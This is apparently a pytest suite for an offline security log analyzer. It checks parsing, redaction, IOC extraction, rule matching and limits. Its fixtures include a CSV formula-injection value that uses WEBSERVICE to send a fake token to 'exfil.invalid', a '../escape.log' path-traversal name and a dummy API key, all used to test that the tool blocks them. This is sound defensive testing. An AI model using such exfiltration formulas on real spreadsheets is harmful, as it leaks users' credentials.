from __future__ import annotations

import json
import socket
from dataclasses import asdict

import pytest

import secmind.log_analysis as log_analysis
from secmind.log_analysis import (
    LogAnalysisLimits,
    LogFormatError,
    LogLimitError,
    SigmaLikeRule,
    analyze_offline_logs,
)
from secmind.secret_scrubber import REDACTED

ARTIFACT_SHA256 = "a" * 64


def analyze(content: bytes, *, name: str, log_format: str = "auto", limits: LogAnalysisLimits | None = None):
    return analyze_offline_logs(
        content,
        source_ref=name,
        artifact_ref="artifact-log-1",
        artifact_sha256=ARTIFACT_SHA256,
        log_format=log_format,  # type: ignore[arg-type]
        limits=limits,
    )


def test_jsonl_bad_segment_is_isolated_and_timeline_is_deterministic() -> None:
    content = b"\n".join(
        (
            b'{"timestamp":"2026-07-14T10:00:02+08:00","event_type":"login","message":"success"}',
            b"not-json",
            b'{"timestamp":"2026-07-14T02:00:01Z","event_type":"login","message":"success two"}',
        )
    )
    result = analyze(content, name="auth.jsonl")

    assert result.status == "partial"
    assert len(result.events) == 2
    assert [event.timestamp_utc for event in result.events] == ["2026-07-14T02:00:01Z", "2026-07-14T02:00:02Z"]
    assert result.timeline_event_ids == tuple(event.event_id for event in result.events)
    assert result.diagnostics[0].code == "record.invalid_json"
    assert result.diagnostics[0].locator is not None
    assert result.diagnostics[0].locator.line_number == 2
    assert result.coverage["model_calls"] == 0
    assert result.coverage["provider_cost"] == 0
    assert result.coverage["network_access_performed"] is False


def test_csv_formula_and_credentials_are_redacted_from_all_observable_output() -> None:
    credential_fixture = "sk-abcdefghijklmnop1234"  # noqa: S105 - adversarial fixture
    formula = '=WEBSERVICE("http://exfil.invalid/?token=' + credential_fixture + '")'
    content = f"timestamp,user,password,message\n2026-07-14T00:00:00Z,alice,{credential_fixture},{formula}\n".encode()
    result = analyze(content, name="events.csv")
    serialized = json.dumps(asdict(result), default=str, ensure_ascii=False)
    evidence_json = "\n".join(item.model_dump_json() for item in result.evidence)

    assert result.status == "partial"
    assert result.events[0].attributes["password"] == REDACTED
    assert result.events[0].attributes["message"] == "[FORMULA_REDACTED]"
    assert any(item.code == "record.formula_redacted" for item in result.diagnostics)
    assert credential_fixture not in serialized
    assert credential_fixture not in evidence_json
    assert "exfil.invalid" not in serialized


def test_csv_bad_width_isolated_while_valid_rows_continue() -> None:
    result = analyze(
        b"timestamp,message\n2026-07-14T00:00:00Z,ok\nonly-one-column\n2026-07-14T00:00:02Z,still-ok\n",
        name="events.csv",
    )
    assert result.status == "partial"
    assert len(result.events) == 2
    assert any(item.code == "record.invalid_delimited" for item in result.diagnostics)


def test_tsv_is_bounded_and_normalized_without_format_guessing() -> None:
    result = analyze(
        b"timestamp\thost\tmessage\n2026-07-14T00:00:00Z\tserver-a\tlogin ok\n",
        name="events.tsv",
    )
    assert result.status == "completed"
    assert result.source_format == "tsv"
    assert result.events[0].entities[0].kind == "host"
    assert result.events[0].entities[0].value == "server-a"


def test_syslog_3164_and_5424_are_normalized_and_iocs_extracted() -> None:
    content = b"\n".join(
        (
            b"<34>Oct 11 22:14:15 host-a sshd[123]: Failed password for bob from 203.0.113.5 port 22",
            b"<165>1 2026-07-14T02:00:00Z host-b app 42 ID47 - connection to https://evil.example/path?q=secret",
        )
    )
    result = analyze(content, name="auth.syslog")

    assert result.status == "completed"
    assert len(result.events) == 2
    assert result.events[1].timestamp_quality == "assumed_timezone"
    observed = {(item.ioc_type, item.normalized_value) for item in result.iocs}
    assert ("ipv4", "203.0.113.5") in observed
    assert ("url", "https://evil.example/path") in observed
    assert all("q=secret" not in item.normalized_value for item in result.iocs)


def test_bad_syslog_segment_and_invalid_priority_do_not_hide_valid_events() -> None:
    content = b"\n".join(
        (
            b"not syslog",
            b"<999>1 2026-07-14T02:00:00Z host app 1 ID - invalid priority",
            b"<34>1 2026-07-14T02:00:01Z host app 1 ID - valid event",
        )
    )
    result = analyze(content, name="events.log")
    assert result.status == "partial"
    assert len(result.events) == 1
    assert [item.code for item in result.diagnostics].count("record.invalid_syslog") == 2


def test_sigma_like_match_and_attack_mapping_are_rule_backed_not_facts() -> None:
    result = analyze(
        b"<34>1 2026-07-14T02:00:00Z host sshd 1 auth - Failed password for invalid user from 198.51.100.2",
        name="auth.log",
        log_format="syslog",
    )
    assert [item.rule_id for item in result.rule_matches] == ["SECMIND-AUTH-BRUTEFORCE-001"]
    assert result.attack_mappings[0].technique_id == "T1110"
    assert result.attack_mappings[0].knowledge_version.startswith("enterprise-attack/")
    assert result.attack_mappings[0].interpretation == "deterministic_supporting_mapping_not_fact"


def test_directory_replication_guid_maps_event_4662_to_dcsync() -> None:
    result = analyze(
        json.dumps(
            {
                "timestamp": "2019-05-08T02:10:43Z",
                "event_type": "windows_event:4662",
                "message": "Windows event 4662 from Microsoft-Windows-Security-Auditing",
                "Properties": "{1131f6ad-9c07-11d1-f79f-00c04fc2dcd2}",
                "SubjectUserName": "Administrator",
            }
        ).encode(),
        name="events.jsonl",
    )

    assert [item.rule_id for item in result.rule_matches] == ["SECMIND-AD-REPLICATION-001"]
    assert len(result.attack_mappings) == 1
    mapping = result.attack_mappings[0]
    assert mapping.technique_id == "T1003.006"
    assert mapping.technique_name == "DCSync"
    assert mapping.interpretation == "deterministic_supporting_mapping_not_fact"


def test_evidence_uses_existing_contract_with_artifact_and_source_locator() -> None:
    result = analyze(
        b'{"timestamp":"2026-07-14T00:00:00Z","message":"Failed password from 192.0.2.1"}',
        name="events.jsonl",
    )
    evidence_types = {item.metadata["evidence_type"] for item in result.evidence}
    assert {"normalized_event", "sigma_match", "ioc_occurrence", "correlation_trace"} <= evidence_types
    for item in result.evidence:
        assert item.artifact_ref == "artifact-log-1"
        assert item.sha256 == ARTIFACT_SHA256
        assert item.metadata["source_artifact_sha256"] == ARTIFACT_SHA256
        if item.metadata["evidence_type"] != "correlation_trace":
            assert item.metadata["source_locator"]["source_ref"] == "events.jsonl"


def test_duplicate_events_removed_and_coverage_is_explicit() -> None:
    record = b'{"timestamp":"2026-07-14T00:00:00Z","message":"same"}'
    result = analyze(record + b"\n" + record, name="events.ndjson")
    assert len(result.events) == 1
    assert result.status == "partial"
    assert result.coverage["duplicates_removed"] == 1
    assert any(item.code == "record.duplicate" for item in result.diagnostics)


def test_oversized_record_is_rejected_without_losing_adjacent_segments() -> None:
    limits = LogAnalysisLimits(max_record_bytes=100)
    content = (
        b'{"timestamp":"2026-07-14T00:00:00Z","message":"ok"}\n'
        + (b"x" * 101)
        + b'\n{"timestamp":"2026-07-14T00:00:02Z","message":"ok two"}'
    )
    result = analyze(content, name="events.jsonl", limits=limits)
    assert result.status == "partial"
    assert len(result.events) == 2
    assert any(item.code == "record.invalid_json" for item in result.diagnostics)
    assert all(len(item.message) <= 512 for item in result.diagnostics)


def test_whole_artifact_and_record_count_limits_fail_safely() -> None:
    with pytest.raises(LogLimitError, match="input exceeds"):
        analyze(b"x" * 101, name="events.log", limits=LogAnalysisLimits(max_input_bytes=100))

    content = b"\n".join(
        json.dumps({"timestamp": f"2026-07-14T00:00:0{i}Z", "message": str(i)}).encode() for i in range(3)
    )
    result = analyze(content, name="events.jsonl", limits=LogAnalysisLimits(max_records=2))
    assert result.status == "partial"
    assert len(result.events) == 2
    assert any(item.code == "record.limit" for item in result.diagnostics)


def test_empty_and_output_bomb_inputs_never_report_complete_coverage() -> None:
    empty = analyze(b"\n", name="events.jsonl")
    assert empty.status == "failed"
    assert any(item.code == "input.empty" for item in empty.diagnostics)

    many_iocs = analyze(
        b'{"message":"192.0.2.1 192.0.2.2"}',
        name="events.jsonl",
        limits=LogAnalysisLimits(max_iocs=1),
    )
    assert many_iocs.status == "partial"
    assert many_iocs.coverage["ioc_limit_reached"] is True
    assert any(item.code == "analysis.ioc_limit" for item in many_iocs.diagnostics)


def test_invalid_source_and_unknown_format_fail_closed() -> None:
    with pytest.raises(ValueError, match="safe relative"):
        analyze(b"anything", name="../escape.log")
    with pytest.raises(LogFormatError, match="unable to detect"):
        analyze(b"unstructured input", name="events.data")


def test_analysis_does_not_use_network_or_models(monkeypatch: pytest.MonkeyPatch) -> None:
    def deny_network(*args: object, **kwargs: object) -> None:
        del args, kwargs
        raise AssertionError("network access is forbidden")

    monkeypatch.setattr(socket, "socket", deny_network)
    monkeypatch.setattr(socket, "create_connection", deny_network)
    result = analyze(
        b'{"timestamp":"2026-07-14T00:00:00Z","message":"visit https://example.invalid/path"}',
        name="events.jsonl",
    )
    assert result.coverage["network_access_performed"] is False
    assert result.coverage["model_calls"] == 0
    assert result.coverage["provider_cost"] == 0


def test_result_is_byte_for_byte_deterministic_except_no_runtime_fields() -> None:
    content = b'{"timestamp":"2026-07-14T00:00:00Z","message":"Failed password from 192.0.2.2"}'
    first = analyze(content, name="events.jsonl")
    second = analyze(content, name="events.jsonl")
    assert asdict(first) == asdict(second)
    assert [item.model_dump(mode="json") for item in first.evidence] == [
        item.model_dump(mode="json") for item in second.evidence
    ]


def test_limit_and_provenance_contracts_reject_invalid_configuration() -> None:
    with pytest.raises(ValueError, match="max_input_bytes must be positive"):
        LogAnalysisLimits(max_input_bytes=0)
    with pytest.raises(ValueError, match="artifact_ref is required"):
        analyze_offline_logs(b"{}", source_ref="events.jsonl", artifact_ref="")
    with pytest.raises(ValueError, match="SHA-256"):
        analyze_offline_logs(
            b"{}",
            source_ref="events.jsonl",
            artifact_ref="artifact",
            artifact_sha256="not-a-digest",
        )
    with pytest.raises(LogFormatError, match="unsupported log format"):
        analyze(b"{}", name="events.jsonl", log_format="xml")


def test_rule_match_rule_bundle_and_evidence_limits_are_explicitly_partial() -> None:
    first = SigmaLikeRule(rule_id="TEST-1", title="first", message_contains_any=("trigger",))
    second = SigmaLikeRule(rule_id="TEST-2", title="second", message_contains_any=("trigger",))
    content = b'{"message":"trigger 192.0.2.1"}'

    with pytest.raises(LogLimitError, match="rule bundle exceeds"):
        analyze_offline_logs(
            content,
            source_ref="events.jsonl",
            artifact_ref="artifact",
            rules=(first, second),
            limits=LogAnalysisLimits(max_rules=1),
        )

    matches = analyze_offline_logs(
        content,
        source_ref="events.jsonl",
        artifact_ref="artifact",
        rules=(first, second),
        limits=LogAnalysisLimits(max_rule_matches=1),
    )
    assert matches.status == "partial"
    assert len(matches.rule_matches) == 1
    assert matches.coverage["rule_match_limit_reached"] is True
    assert any(item.code == "analysis.rule_match_limit" for item in matches.diagnostics)

    evidence = analyze(content, name="events.jsonl", limits=LogAnalysisLimits(max_evidence=1))
    assert evidence.status == "partial"
    assert len(evidence.evidence) == 1
    assert any(item.code == "evidence.limit" for item in evidence.diagnostics)


@pytest.mark.parametrize(
    ("content", "limits"),
    [
        pytest.param(b"[]", LogAnalysisLimits(), id="non-object"),
        pytest.param(b'{"a":1,"a":2}', LogAnalysisLimits(), id="duplicate-key"),
        pytest.param(b'{"a":{"b":{"c":1}}}', LogAnalysisLimits(max_json_depth=2), id="depth"),
        pytest.param(b'{"message":[1,2,3]}', LogAnalysisLimits(max_json_nodes=3), id="nodes"),
        pytest.param(b'{"a":1,"b":2}', LogAnalysisLimits(max_fields=1), id="fields"),
        pytest.param(b'{"message":"xx"}', LogAnalysisLimits(max_field_chars=1), id="field-chars"),
        pytest.param(b'{"message":"ok\x01"}', LogAnalysisLimits(), id="control-character"),
    ],
)
def test_jsonl_structural_attacks_are_isolated(content: bytes, limits: LogAnalysisLimits) -> None:
    result = analyze(content, name="events.jsonl", limits=limits)
    assert result.status == "failed"
    assert result.events == ()
    assert any(item.code == "record.invalid_json" for item in result.diagnostics)


def test_parser_diagnostic_fanout_is_bounded_before_evidence_projection() -> None:
    content = b"\n".join(b"[]" for _ in range(1_000))

    result = analyze(
        content,
        name="invalid.jsonl",
        limits=LogAnalysisLimits(max_records=1_000, max_diagnostics=8),
    )

    assert result.status == "failed"
    assert len(result.diagnostics) == 8
    assert len(result.evidence) <= 8
    assert result.coverage["diagnostics_seen"] == 1_000
    assert result.coverage["diagnostics_truncated"] is True
    assert result.diagnostics[-1].code == "parser.diagnostic_limit"


def test_delimited_header_and_record_boundaries_fail_closed() -> None:
    empty = analyze(b"", name="events.csv", log_format="csv")
    assert empty.status == "failed"
    assert any(item.code == "input.empty" for item in empty.diagnostics)

    with pytest.raises(LogFormatError, match="invalid delimited header"):
        analyze(b"\xff,message\n", name="events.csv", log_format="csv")
    with pytest.raises(LogFormatError, match="field limit"):
        analyze(b"a,b\n1,2\n", name="events.csv", limits=LogAnalysisLimits(max_fields=1))
    with pytest.raises(LogFormatError, match="duplicate delimited"):
        analyze(b"a,a\n1,2\n", name="events.csv")

    sanitized = analyze(b",=unsafe,timestamp\nvalue,value,2026-07-14T00:00:00Z\n", name="events.csv")
    assert sanitized.status == "partial"
    assert [item.code for item in sanitized.diagnostics].count("header.sanitized") == 2

    bounded = analyze(
        b"timestamp,message\n\n2026-07-14T00:00:00Z,ok\n2026-07-14T00:00:01Z,later\n",
        name="events.csv",
        limits=LogAnalysisLimits(max_records=1),
    )
    assert len(bounded.events) == 1
    assert any(item.code == "record.limit" for item in bounded.diagnostics)

    long_field = analyze(
        b"message\n12345\n",
        name="events.csv",
        limits=LogAnalysisLimits(max_field_chars=4),
    )
    assert long_field.status == "failed"
    assert any(item.code == "record.invalid_delimited" for item in long_field.diagnostics)


def test_syslog_blank_and_record_limit_preserve_the_first_valid_event() -> None:
    content = b"\n".join(
        (
            b"",
            b"<34>1 2026-07-14T00:00:00Z host app 1 ID - first",
            b"<34>1 2026-07-14T00:00:01Z host app 1 ID - second",
        )
    )
    result = analyze(content, name="events.log", limits=LogAnalysisLimits(max_records=1))
    assert result.status == "partial"
    assert len(result.events) == 1
    assert any(item.code == "record.limit" for item in result.diagnostics)


@pytest.mark.parametrize(
    ("content", "expected"),
    [
        (b'{"message":"event"}', "jsonl"),
        (b"<34>1 2026-07-14T00:00:00Z host app 1 ID - event", "syslog"),
        (b"timestamp\tmessage\n2026-07-14T00:00:00Z\tevent", "tsv"),
        (b"timestamp,message\n2026-07-14T00:00:00Z,event", "csv"),
    ],
)
def test_content_sniffing_uses_only_allowlisted_formats(content: bytes, expected: str) -> None:
    result = analyze(content, name="events.data")
    assert result.source_format == expected
    assert result.events


def test_numeric_naive_and_invalid_timestamps_are_distinguished() -> None:
    records = (
        {"timestamp": 1_700_000_000, "message": "seconds"},
        {"timestamp": 1_700_000_000_000, "message": "milliseconds"},
        {"timestamp": "2026-07-14T01:02:03", "message": "naive"},
        {"timestamp": "not-a-time", "message": "invalid"},
    )
    result = analyze(b"\n".join(json.dumps(item).encode() for item in records), name="events.jsonl")
    qualities = {item.message: item.timestamp_quality for item in result.events}
    assert qualities == {
        "seconds": "exact",
        "milliseconds": "exact",
        "naive": "assumed_timezone",
        "invalid": "invalid",
    }
    assert (
        next(item for item in result.events if item.message == "seconds").timestamp_utc
        == next(item for item in result.events if item.message == "milliseconds").timestamp_utc
    )


@pytest.mark.parametrize(
    ("severity", "expected"),
    [
        ("fatal", "CRITICAL"),
        ("error", "HIGH"),
        ("warning", "MEDIUM"),
        ("info", "LOW"),
        ("2", "HIGH"),
        ("5", "MEDIUM"),
        ("8", "LOW"),
        ("custom", "UNKNOWN"),
    ],
)
def test_severity_aliases_and_numeric_levels_are_stable(severity: str, expected: str) -> None:
    content = json.dumps({"severity": severity, "message": f"severity {severity}"}).encode()
    result = analyze(content, name="events.jsonl")
    assert result.events[0].severity == expected


def test_ioc_normalization_handles_email_hash_domain_and_invalid_candidates() -> None:
    assert log_analysis._normalize_url("ftp://example.com/payload") is None
    sha = "A" * 64
    result = analyze(
        (
            '{"message":"analyst@Example.COM 999.999.999.999 '
            f'{sha} portal.example.org http:// https://example.com:99999/path"}}'
        ).encode(),
        name="events.jsonl",
    )
    by_type = {item.ioc_type: item for item in result.iocs}
    assert by_type["email"].normalized_value == "analyst@example.com"
    assert by_type["email"].display_value == "a***@example.com"
    assert by_type["sha256"].normalized_value == sha.lower()
    assert by_type["domain"].normalized_value in {"example.com", "portal.example.org"}
    assert all(item.normalized_value != "999.999.999.999" for item in result.iocs)


def test_structured_syslog_and_flattened_lists_remain_bounded() -> None:
    syslog = analyze(
        b'<34>1 2026-07-14T00:00:00Z host app 1 ID [meta key="value"] payload',
        name="events.log",
    )
    assert syslog.events[0].message == "payload"
    malformed_structure = analyze(
        b"<34>1 2026-07-14T00:00:01Z host app 1 ID [unterminated payload",
        name="events.log",
    )
    assert malformed_structure.events[0].message == "[unterminated payload"

    nested: dict[str, object] = {"items": ["one", {"not": "scalar"}, "two"]}
    cursor = nested
    for index in range(10):
        child: dict[str, object] = {"value": index}
        cursor["nested"] = child
        cursor = child
    flattened = analyze(json.dumps(nested).encode(), name="events.jsonl")
    assert flattened.events[0].attributes["items"] == ["one", "two"]
    assert not any(key.count(".") > 8 for key in flattened.events[0].attributes)


def test_defensive_scrubber_contracts_fail_closed(monkeypatch: pytest.MonkeyPatch) -> None:
    record_calls = 0

    def invalid_record_mapping(value: object, **kwargs: object) -> object:
        nonlocal record_calls
        record_calls += 1
        if kwargs and record_calls == 1:
            return "invalid"
        return dict(value) if isinstance(value, dict) else value

    monkeypatch.setattr(log_analysis, "scrub_value", invalid_record_mapping)
    record = analyze(b'{"message":"event"}', name="events.jsonl")
    assert record.status == "failed"
    assert any(item.code == "record.invalid_json" for item in record.diagnostics)

    calls = 0

    def invalid_evidence_metadata(value: object, **kwargs: object) -> object:
        nonlocal calls
        calls += 1
        return value if kwargs or calls == 1 else "invalid"

    monkeypatch.setattr(log_analysis, "scrub_value", invalid_evidence_metadata)
    with pytest.raises(LogFormatError, match="evidence scrubber"):
        analyze(b'{"message":"event"}', name="events.jsonl")
